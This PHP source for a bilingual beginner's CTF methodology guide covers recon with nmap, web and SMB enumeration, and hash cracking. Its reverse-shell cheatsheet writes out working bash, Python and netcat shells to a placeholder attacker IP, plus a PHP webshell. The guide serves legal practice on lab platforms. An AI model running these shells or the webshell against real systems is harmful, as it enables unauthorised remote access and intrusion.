<?php
require_once __DIR__ . '/../bootstrap.php';
$pageTitle    = $lang==='es' ? 'Metodología CTF: Guía Completa para Principiantes — CyberEscudo' : 'CTF Methodology: Complete Beginner\'s Guide — CyberEscudo';
$contentTitle = $lang==='es' ? 'Metodología CTF: Guía Completa para Principiantes' : 'CTF Methodology: Complete Beginner\'s Guide';
$contentDate  = '2024-10-01';
$contentDiff  = 'basic';
$contentTags  = ['CTF','HackTheBox','TryHackMe','Metodología','Web','Pwn','Forense'];
ob_start(); if ($lang==='es'): ?>
<div class="prose">
  <p>Los <strong>CTF (Capture The Flag)</strong> son competiciones de ciberseguridad donde debes encontrar "flags" (cadenas secretas) resolviendo retos técnicos. Son la mejor forma de practicar hacking ético en entornos legales. Esta guía cubre la metodología, las categorías más comunes y las herramientas imprescindibles.</p>

  <h2>1. Plataformas de práctica recomendadas</h2>
  <pre><code># Para aprender — salas guiadas paso a paso:
# https://tryhackme.com       ← Ideal para principiantes
# https://picoctf.org         ← CTF educativo de CMU

# Para practicar solo — máquinas sin guía:
# https://hackthebox.com      ← Nivel intermedio/avanzado
# https://vulnhub.com         ← VMs descargables offline
# https://pwn.college         ← Especializado en binarios

# Competiciones en vivo:
# https://ctftime.org         ← Calendario global de CTFs</code></pre>

  <h2>2. Metodología general para máquinas (HTB/THM)</h2>
  <pre><code># Paso 1 — Reconocimiento inicial:
export IP=10.10.10.X          # Guardar IP del objetivo
nmap -sV -sC -T4 $IP          # Escaneo rápido de puertos
nmap -p- --min-rate 5000 $IP  # Escaneo completo de puertos

# Paso 2 — Enumeración de servicios según puertos:
# Puerto 80/443 → Enumerar web
# Puerto 21 → FTP (probar anonymous login)
# Puerto 22 → SSH (bruteforce si tenemos usuario)
# Puerto 139/445 → SMB (enum4linux, smbclient)

# Paso 3 — Obtener acceso inicial (foothold)
# Paso 4 — Escalada de privilegios (root/system)
# Paso 5 — Capturar flags: user.txt y root.txt</code></pre>

  <h2>3. Enumeración web (categoría más común)</h2>
  <pre><code># Reconocimiento básico:
whatweb http://$IP             # Detectar tecnologías
curl -I http://$IP             # Headers HTTP
nikto -h http://$IP            # Escaneo de vulnerabilidades

# Directorios y archivos:
gobuster dir -u http://$IP \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt,bak -t 50

# Subdominios (si hay un dominio):
echo "$IP  objetivo.htb" | sudo tee -a /etc/hosts
gobuster dns -d objetivo.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Inspección manual:
# Ver código fuente (Ctrl+U)
# Revisar /robots.txt, /sitemap.xml, /.git/, /backup/
# Probar credenciales comunes: admin/admin, admin/password</code></pre>

  <h2>4. Enumeración de SMB (Windows)</h2>
  <pre><code># Enumerar con enum4linux-ng:
enum4linux-ng -A $IP

# Listar shares con smbclient:
smbclient -L //$IP -N             # Sin contraseña
smbclient //$IP/SHARE -N          # Acceder a share concreto

# Con crackmapexec:
crackmapexec smb $IP
crackmapexec smb $IP --shares -u '' -p ''
crackmapexec smb $IP --shares -u 'guest' -p ''

# Montar share localmente:
mkdir /mnt/smb
sudo mount -t cifs //$IP/Data /mnt/smb -o username=,password=</code></pre>

  <h2>5. Shells reversas — cheatsheet</h2>
  <pre><code># Poner netcat en escucha (en tu máquina):
nc -lvnp 4444
rlwrap nc -lvnp 4444    # Con historial de comandos

# Shells reversas (bash):
bash -i >& /dev/tcp/TU_IP/4444 0>&1

# Python:
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("TU_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PHP (útil en RCE web):
&lt;?php system($_GET['cmd']); ?&gt;
# Luego: /vuln.php?cmd=bash+-i+>&+/dev/tcp/TU_IP/4444+0>&1

# netcat:
nc TU_IP 4444 -e /bin/bash

# Upgradear shell básica a TTY completo:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm</code></pre>

  <h2>6. Categorías comunes de CTF y herramientas</h2>
  <table>
    <thead><tr><th>Categoría</th><th>Descripción</th><th>Herramientas clave</th></tr></thead>
    <tbody>
      <tr><td>Web</td><td>SQLi, XSS, IDOR, SSRF, path traversal</td><td>Burp Suite, sqlmap, ffuf</td></tr>
      <tr><td>Criptografía</td><td>Cifrados clásicos, RSA débil, hash cracking</td><td>CyberChef, john, hashcat, SageMath</td></tr>
      <tr><td>Reversing</td><td>Análisis de binarios, decompilación</td><td>Ghidra, IDA Free, radare2, strings</td></tr>
      <tr><td>Pwn/Binario</td><td>Buffer overflow, ret2libc, ROP chains</td><td>pwntools, gdb-peda, ROPgadget</td></tr>
      <tr><td>Forense</td><td>Análisis de imágenes, capturas de red, memoria</td><td>Volatility, Autopsy, Wireshark, binwalk</td></tr>
      <tr><td>OSINT</td><td>Reconocimiento pasivo, redes sociales</td><td>theHarvester, Maltego, Shodan</td></tr>
      <tr><td>Esteganografía</td><td>Datos ocultos en imágenes/audio</td><td>steghide, stegseek, zsteg, binwalk</td></tr>
    </tbody>
  </table>

  <h2>7. Trucos y buenas prácticas en CTF</h2>
  <pre><code># Siempre tomar notas:
mkdir ~/ctf/maquina && cd ~/ctf/maquina
nano notas.md      # Documentar cada paso

# Buscar la flag en los sitios típicos (Linux):
find / -name "user.txt" 2>/dev/null
find / -name "root.txt" 2>/dev/null
find / -name "flag*.txt" 2>/dev/null

# CyberChef para decodificar texto sospechoso:
# https://gchq.github.io/CyberChef/
# Útil para: base64, hex, ROT13, URL encode, JWT...

# Identificar tipo de hash:
hash-identifier "5f4dcc3b5aa765d61d8327deb882cf99"
hashid "5f4dcc3b5aa765d61d8327deb882cf99"

# Crackear hashes rápido con john:
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt</code></pre>
</div>
<?php else: ?>
<div class="prose">
  <p><strong>CTF (Capture The Flag)</strong> competitions are cybersecurity events where you find "flags" (secret strings) by solving technical challenges. They are the best legal way to practise ethical hacking. This guide covers methodology, common categories, and essential tools.</p>

  <h2>1. Recommended Practice Platforms</h2>
  <pre><code># Guided rooms — best for beginners:
# https://tryhackme.com
# https://picoctf.org

# Solo machines — intermediate/advanced:
# https://hackthebox.com
# https://vulnhub.com
# https://pwn.college   (binary exploitation)

# Live competitions:
# https://ctftime.org   (global CTF calendar)</code></pre>

  <h2>2. General Methodology for Machines (HTB/THM)</h2>
  <pre><code># Step 1 — Initial recon:
export IP=10.10.10.X
nmap -sV -sC -T4 $IP
nmap -p- --min-rate 5000 $IP

# Step 2 — Enumerate services by port:
# Port 80/443 → Web enumeration
# Port 21  → FTP (try anonymous login)
# Port 22  → SSH (brute force if username known)
# Port 445 → SMB (enum4linux, smbclient)

# Step 3 — Gain initial foothold
# Step 4 — Privilege escalation to root/system
# Step 5 — Capture flags: user.txt and root.txt</code></pre>

  <h2>3. Web Enumeration (Most Common Category)</h2>
  <pre><code># Basic recon:
whatweb http://$IP
curl -I http://$IP
nikto -h http://$IP

# Directory and file discovery:
gobuster dir -u http://$IP \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt,bak -t 50

# Subdomain discovery:
echo "$IP  target.htb" | sudo tee -a /etc/hosts
gobuster dns -d target.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Manual checks:
# View source (Ctrl+U)
# Check /robots.txt, /sitemap.xml, /.git/, /backup/
# Try default creds: admin/admin, admin/password</code></pre>

  <h2>4. SMB Enumeration (Windows)</h2>
  <pre><code># Enumerate with enum4linux-ng:
enum4linux-ng -A $IP

# List shares:
smbclient -L //$IP -N
smbclient //$IP/SHARE -N

# With crackmapexec:
crackmapexec smb $IP --shares -u '' -p ''

# Mount share locally:
sudo mount -t cifs //$IP/Data /mnt/smb -o username=,password=</code></pre>

  <h2>5. Reverse Shells Cheatsheet</h2>
  <pre><code># Listen on attacker machine:
nc -lvnp 4444
rlwrap nc -lvnp 4444    # With command history

# Bash reverse shell:
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# Python:
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PHP webshell (RCE):
&lt;?php system($_GET["cmd"]); ?&gt;

# Upgrade basic shell to full TTY:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm</code></pre>

  <h2>6. CTF Categories & Tools</h2>
  <table>
    <thead><tr><th>Category</th><th>Description</th><th>Key Tools</th></tr></thead>
    <tbody>
      <tr><td>Web</td><td>SQLi, XSS, IDOR, SSRF, path traversal</td><td>Burp Suite, sqlmap, ffuf</td></tr>
      <tr><td>Cryptography</td><td>Classic ciphers, weak RSA, hash cracking</td><td>CyberChef, john, hashcat</td></tr>
      <tr><td>Reversing</td><td>Binary analysis, decompilation</td><td>Ghidra, IDA Free, radare2</td></tr>
      <tr><td>Pwn/Binary</td><td>Buffer overflow, ret2libc, ROP chains</td><td>pwntools, gdb-peda, ROPgadget</td></tr>
      <tr><td>Forensics</td><td>Disk images, network captures, memory</td><td>Volatility, Autopsy, Wireshark</td></tr>
      <tr><td>OSINT</td><td>Passive recon, social media</td><td>theHarvester, Shodan, Maltego</td></tr>
      <tr><td>Steganography</td><td>Hidden data in images/audio</td><td>steghide, stegseek, zsteg</td></tr>
    </tbody>
  </table>

  <h2>7. CTF Tips & Best Practices</h2>
  <pre><code># Always take notes:
mkdir ~/ctf/machine && cd ~/ctf/machine
nano notes.md

# Find flags (Linux):
find / -name "user.txt" 2>/dev/null
find / -name "root.txt" 2>/dev/null

# CyberChef for suspicious strings:
# https://gchq.github.io/CyberChef/
# Useful for: base64, hex, ROT13, URL encode, JWT...

# Identify hash type:
hash-identifier "5f4dcc3b5aa765d61d8327deb882cf99"
hashid "5f4dcc3b5aa765d61d8327deb882cf99"

# Crack hashes:
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt</code></pre>
</div>
<?php endif; $contentBody=ob_get_clean(); require __DIR__.'/../templates/content-page.php';
